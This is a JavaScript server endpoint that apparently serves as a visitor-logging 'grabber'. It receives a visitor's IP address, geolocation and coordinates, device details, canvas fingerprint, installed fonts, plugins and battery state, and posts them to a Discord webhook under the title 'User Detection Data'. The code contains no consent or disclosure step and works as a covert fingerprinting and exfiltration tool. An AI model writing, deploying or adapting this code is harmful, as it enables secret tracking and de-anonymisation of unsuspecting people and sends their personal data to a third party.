export async function POST(request) {
  try {
    const body = await request.json();
    const {
      ip,
      geolocation,
      os,
      device,
      browser,
      timestamp = new Date().toISOString(),
      userAgent,
      screenResolution,
      language,
      timezone,
      referrer,
      platform,
      cpuCores,
      memory,
      touchSupport,
      plugins,
      canvasFingerprint,
      webglVendor,
      fonts,
      batteryInfo
    } = body;
    
    const webhookURL = process.env.spiderwebb;
    
    if (!webhookURL) {
      throw new Error("Webhook URL not configured");
    }
    
    const fields = [];
    
    fields.push(
      {
        name: "🌐 IP Address",
        value: ip || "Not provided",
        inline: true
      },
      {
        name: "🖥️ Platform",
        value: platform || os || "Not provided",
        inline: true
      },
      {
        name: "📱 Device",
        value: device || "Not provided",
        inline: true
      },
      {
        name: "🌍 Browser",
        value: browser || "Not provided",
        inline: true
      }
    );
    
    if (geolocation) {
      const locationParts = [];
      if (geolocation.city) locationParts.push(geolocation.city);
      if (geolocation.region) locationParts.push(geolocation.region);
      if (geolocation.country) locationParts.push(geolocation.country);
      if (geolocation.zip) locationParts.push(geolocation.zip);
      if (geolocation.latitude && geolocation.longitude) {
        locationParts.push(`📍 ${geolocation.latitude}, ${geolocation.longitude}`);
      }
      if (locationParts.length) {
        fields.push({
          name: "📍 Location",
          value: locationParts.join(", "),
          inline: true
        });
      }
    }
    
    if (userAgent) {
      fields.push({
        name: "🔧 User Agent",
        value: userAgent.length > 100 ? userAgent.substring(0, 97) + "..." : userAgent,
        inline: false
      });
    }
    
    if (screenResolution) {
      fields.push({
        name: "📺 Screen Resolution",
        value: screenResolution,
        inline: true
      });
    }
    
    if (language) {
      fields.push({
        name: "🗣️ Language",
        value: language,
        inline: true
      });
    }
    
    if (timezone) {
      fields.push({
        name: "⏰ Timezone",
        value: timezone,
        inline: true
      });
    }
    
    if (referrer) {
      fields.push({
        name: "🔗 Referrer",
        value: referrer.length > 100 ? referrer.substring(0, 97) + "..." : referrer,
        inline: false
      });
    }
    
    if (cpuCores) {
      fields.push({
        name: "⚙️ CPU Cores",
        value: cpuCores.toString(),
        inline: true
      });
    }
    
    if (memory) {
      fields.push({
        name: "💾 Memory",
        value: memory,
        inline: true
      });
    }
    
    if (touchSupport !== undefined) {
      fields.push({
        name: "👆 Touch Support",
        value: touchSupport ? "Yes" : "No",
        inline: true
      });
    }
    
    if (plugins && plugins.length) {
      const pluginList = plugins.slice(0, 5).join(", ");
      fields.push({
        name: "🔌 Browser Plugins",
        value: pluginList.length > 100 ? pluginList.substring(0, 97) + "..." : pluginList,
        inline: false
      });
    }
    
    if (canvasFingerprint) {
      fields.push({
        name: "🎨 Canvas Fingerprint",
        value: canvasFingerprint.substring(0, 100),
        inline: true
      });
    }
    
    if (webglVendor) {
      fields.push({
        name: "🎮 WebGL Vendor",
        value: webglVendor,
        inline: true
      });
    }
    
    if (fonts && fonts.length) {
      const fontList = fonts.slice(0, 5).join(", ");
      fields.push({
        name: "✍️ Installed Fonts",
        value: fontList.length > 100 ? fontList.substring(0, 97) + "..." : fontList,
        inline: false
      });
    }
    
    if (batteryInfo) {
      fields.push({
        name: "🔋 Battery",
        value: `${batteryInfo.level}% ${batteryInfo.charging ? "(Charging)" : ""}`,
        inline: true
      });
    }
    
    const embed = {
      title: "🎯 User Detection Data",
      color: 0x5865f2,
      fields: fields,
      footer: {
        text: "Detection Time"
      },
      timestamp: timestamp
    };
    
    const response = await fetch(webhookURL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({ embeds: [embed] }),
    });
    
    if (!response.ok) {
      throw new Error(`Webhook failed with status: ${response.status}`);
    }
    
    return new Response(
      JSON.stringify({ success: true, message: "Data sent to Discord successfully" }),
      {
        status: 200,
        headers: { "Content-Type": "application/json" },
      }
    );
  } catch (error) {
    return new Response(
      JSON.stringify({ success: false, error: error.message }),
      {
        status: 500,
        headers: { "Content-Type": "application/json" },
      }
    );
  }
}